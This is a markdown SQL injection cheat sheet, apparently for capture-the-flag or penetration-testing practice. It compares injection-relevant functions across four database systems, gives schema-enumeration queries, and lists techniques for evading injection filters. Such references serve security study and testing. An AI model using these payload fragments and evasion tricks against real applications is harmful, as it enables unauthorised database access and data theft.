# DBMS cheat sheet

| | SQLite | MySQL / MariaDB | PostgreSQL | MSSQL |
|---|---|---|---|---|
| Version | `sqlite_version()` | `@@version`, `version()` | `version()` | `@@version` |
| Current DB | — | `database()` | `current_database()` | `db_name()` |
| User | — | `user()` | `current_user` | `system_user` |
| Comment | `--` `/**/` | `-- -` `#` `/**/` | `--` `/**/` | `--` `/**/` |
| Concat | `a\|\|b` | `CONCAT(a,b)` | `a\|\|b` | `a+b` |
| Substring | `substr(s,p,1)` | `SUBSTRING(s,p,1)` / `MID` | `SUBSTRING(s,p,1)` | `SUBSTRING(s,p,1)` |
| Char code | `unicode(c)` | `ASCII(c)` / `ORD` | `ASCII(c)` | `ASCII(c)` |
| Length | `length(s)` | `LENGTH(s)` | `LENGTH(s)` | `LEN(s)` |
| Aggregate | `group_concat(x)` | `GROUP_CONCAT(x)` | `string_agg(x,',')` | `STRING_AGG(x,',')` |
| Sleep | heavy `randomblob` | `SLEEP(n)` | `pg_sleep(n)` | `WAITFOR DELAY '0:0:n'` |
| If | `CASE WHEN c THEN a ELSE b END` | `IF(c,a,b)` | `CASE…` | `IIF`/`CASE` |
| Limit | `LIMIT 1 OFFSET n` | `LIMIT n,1` | `LIMIT 1 OFFSET n` | `TOP 1` / `OFFSET n ROWS` |
| Hex literal | `X'41'` | `0x41` | `'\x41'`/`decode` | `0x41` |

## Enumerate schema
```sql
-- SQLite
SELECT group_concat(name) FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='vault'            -- CREATE TABLE text = columns
-- MySQL
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='vault'
-- Postgres
SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'
SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='vault'
-- MSSQL
SELECT STRING_AGG(name,',') FROM sys.tables
```

## Filter evasion
Spaces → `/**/`, `%09`, `%0a`, `()`: `UNION/**/SELECT`. Keywords → case `UnIoN`, double `UNUNIONION`
(if stripped once), MySQL versioned comments `/*!50000UNION*/`. Quotes → hex `0x61646d696e`,
`CHAR(97,100)`. `=` → `LIKE`, `IN`, `BETWEEN`. Commas → `JOIN` for UNION columns,
`SUBSTRING(x FROM p FOR 1)`.
